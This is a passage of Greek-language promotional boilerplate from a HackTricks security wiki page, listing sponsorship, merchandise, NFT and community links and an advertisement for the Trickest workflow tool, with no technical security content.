* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
